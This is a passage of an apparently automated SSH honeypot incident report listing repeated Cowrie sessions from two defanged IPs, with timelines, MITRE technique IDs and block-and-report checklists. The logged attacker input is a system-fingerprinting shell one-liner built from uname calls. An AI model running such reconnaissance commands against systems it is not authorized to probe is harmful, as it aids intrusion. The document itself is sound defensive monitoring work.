| `2026-08-02 03:15:08` | `cowrie.login.success` |
| `2026-08-02 03:15:10` | `cowrie.session.params` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.success` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:10` | `cowrie.command.input` |
| `2026-08-02 03:15:11` | `cowrie.log.closed` |
| `2026-08-02 03:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993abd102bd5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:16 |
| **Last Seen** | 2026-08-02 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:16:02` | `cowrie.session.connect` |
| `2026-08-02 03:16:02` | `cowrie.client.version` |
| `2026-08-02 03:16:02` | `cowrie.client.kex` |
| `2026-08-02 03:16:02` | `cowrie.login.success` |
| `2026-08-02 03:16:03` | `cowrie.session.params` |
| `2026-08-02 03:16:03` | `cowrie.command.input` |
| `2026-08-02 03:16:03` | `cowrie.log.closed` |
| `2026-08-02 03:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1bb864c02e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:16 |
| **Last Seen** | 2026-08-02 03:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:16:13` | `cowrie.session.connect` |
| `2026-08-02 03:16:13` | `cowrie.client.version` |
| `2026-08-02 03:16:13` | `cowrie.client.kex` |
| `2026-08-02 03:16:15` | `cowrie.login.success` |
| `2026-08-02 03:16:17` | `cowrie.session.params` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.success` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.command.input` |
| `2026-08-02 03:16:17` | `cowrie.log.closed` |
| `2026-08-02 03:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035df71186ec

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:17 |
| **Last Seen** | 2026-08-02 03:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:17:21` | `cowrie.session.connect` |
| `2026-08-02 03:17:22` | `cowrie.client.version` |
| `2026-08-02 03:17:22` | `cowrie.client.kex` |
| `2026-08-02 03:17:23` | `cowrie.login.success` |
| `2026-08-02 03:17:25` | `cowrie.session.params` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.success` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.command.input` |
| `2026-08-02 03:17:25` | `cowrie.log.closed` |
| `2026-08-02 03:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-181e166cf475

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:17 |
| **Last Seen** | 2026-08-02 03:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:17:37` | `cowrie.session.connect` |
| `2026-08-02 03:17:37` | `cowrie.client.version` |
| `2026-08-02 03:17:37` | `cowrie.client.kex` |
| `2026-08-02 03:17:38` | `cowrie.login.success` |
| `2026-08-02 03:17:38` | `cowrie.session.params` |
| `2026-08-02 03:17:38` | `cowrie.command.input` |
| `2026-08-02 03:17:39` | `cowrie.log.closed` |
| `2026-08-02 03:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e90b9c6aed

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:18 |
| **Last Seen** | 2026-08-02 03:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:18:31` | `cowrie.session.connect` |
| `2026-08-02 03:18:31` | `cowrie.client.version` |
| `2026-08-02 03:18:31` | `cowrie.client.kex` |
| `2026-08-02 03:18:32` | `cowrie.login.success` |
| `2026-08-02 03:18:34` | `cowrie.session.params` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.success` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.command.input` |
| `2026-08-02 03:18:34` | `cowrie.log.closed` |
| `2026-08-02 03:18:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a358947a3932

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:19 |
| **Last Seen** | 2026-08-02 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:19:11` | `cowrie.session.connect` |
| `2026-08-02 03:19:11` | `cowrie.client.version` |
| `2026-08-02 03:19:11` | `cowrie.client.kex` |
| `2026-08-02 03:19:11` | `cowrie.login.success` |
| `2026-08-02 03:19:12` | `cowrie.session.params` |
| `2026-08-02 03:19:12` | `cowrie.command.input` |
| `2026-08-02 03:19:12` | `cowrie.log.closed` |
| `2026-08-02 03:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-112970e05ff4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:19 |
| **Last Seen** | 2026-08-02 03:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:19:43` | `cowrie.session.connect` |
| `2026-08-02 03:19:43` | `cowrie.client.version` |
| `2026-08-02 03:19:43` | `cowrie.client.kex` |
| `2026-08-02 03:19:44` | `cowrie.login.success` |
| `2026-08-02 03:19:46` | `cowrie.session.params` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.success` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.command.input` |
| `2026-08-02 03:19:46` | `cowrie.log.closed` |
| `2026-08-02 03:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e9bb78fd71

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:20 |
| **Last Seen** | 2026-08-02 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:20:44` | `cowrie.session.connect` |
| `2026-08-02 03:20:44` | `cowrie.client.version` |
| `2026-08-02 03:20:44` | `cowrie.client.kex` |
| `2026-08-02 03:20:45` | `cowrie.login.success` |
| `2026-08-02 03:20:46` | `cowrie.session.params` |
| `2026-08-02 03:20:46` | `cowrie.command.input` |
| `2026-08-02 03:20:46` | `cowrie.log.closed` |
| `2026-08-02 03:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1b56b21dbc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:20 |
| **Last Seen** | 2026-08-02 03:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:20:52` | `cowrie.session.connect` |
| `2026-08-02 03:20:52` | `cowrie.client.version` |
| `2026-08-02 03:20:52` | `cowrie.client.kex` |
| `2026-08-02 03:20:53` | `cowrie.login.success` |
| `2026-08-02 03:20:54` | `cowrie.session.params` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.success` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:54` | `cowrie.command.input` |
| `2026-08-02 03:20:55` | `cowrie.log.closed` |
| `2026-08-02 03:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816da13e5458

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:21 |
| **Last Seen** | 2026-08-02 03:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:21:57` | `cowrie.session.connect` |
| `2026-08-02 03:21:57` | `cowrie.client.version` |
| `2026-08-02 03:21:57` | `cowrie.client.kex` |
| `2026-08-02 03:21:59` | `cowrie.login.success` |
| `2026-08-02 03:22:00` | `cowrie.session.params` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.success` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:00` | `cowrie.command.input` |
| `2026-08-02 03:22:01` | `cowrie.log.closed` |
| `2026-08-02 03:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25a7ebaebc5e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:22 |
| **Last Seen** | 2026-08-02 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:22:13` | `cowrie.session.connect` |
| `2026-08-02 03:22:13` | `cowrie.client.version` |
| `2026-08-02 03:22:13` | `cowrie.client.kex` |
| `2026-08-02 03:22:13` | `cowrie.login.success` |
| `2026-08-02 03:22:14` | `cowrie.session.params` |
| `2026-08-02 03:22:14` | `cowrie.command.input` |
| `2026-08-02 03:22:14` | `cowrie.log.closed` |
| `2026-08-02 03:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9db901ea57e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:23 |
| **Last Seen** | 2026-08-02 03:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:23:00` | `cowrie.session.connect` |
| `2026-08-02 03:23:00` | `cowrie.client.version` |
| `2026-08-02 03:23:01` | `cowrie.client.kex` |
| `2026-08-02 03:23:01` | `cowrie.login.success` |
| `2026-08-02 03:23:02` | `cowrie.session.params` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.success` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:02` | `cowrie.command.input` |
| `2026-08-02 03:23:03` | `cowrie.log.closed` |
| `2026-08-02 03:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5378bf170269

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:23 |
| **Last Seen** | 2026-08-02 03:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:23:41` | `cowrie.session.connect` |
| `2026-08-02 03:23:41` | `cowrie.client.version` |
| `2026-08-02 03:23:41` | `cowrie.client.kex` |
| `2026-08-02 03:23:42` | `cowrie.login.success` |
| `2026-08-02 03:23:43` | `cowrie.session.params` |
| `2026-08-02 03:23:43` | `cowrie.command.input` |
| `2026-08-02 03:23:43` | `cowrie.log.closed` |
| `2026-08-02 03:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd118e738e7c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:24 |
| **Last Seen** | 2026-08-02 03:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:24:08` | `cowrie.session.connect` |
| `2026-08-02 03:24:08` | `cowrie.client.version` |
| `2026-08-02 03:24:08` | `cowrie.client.kex` |
| `2026-08-02 03:24:09` | `cowrie.login.success` |
| `2026-08-02 03:24:11` | `cowrie.session.params` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.success` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.command.input` |
| `2026-08-02 03:24:11` | `cowrie.log.closed` |
| `2026-08-02 03:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae312d1ed027

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:25 |
| **Last Seen** | 2026-08-02 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:25:14` | `cowrie.session.connect` |
| `2026-08-02 03:25:14` | `cowrie.client.version` |
| `2026-08-02 03:25:14` | `cowrie.client.kex` |
| `2026-08-02 03:25:15` | `cowrie.login.success` |
| `2026-08-02 03:25:15` | `cowrie.session.params` |
| `2026-08-02 03:25:15` | `cowrie.command.input` |
| `2026-08-02 03:25:16` | `cowrie.log.closed` |
| `2026-08-02 03:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e6f231109e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:25 |
| **Last Seen** | 2026-08-02 03:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
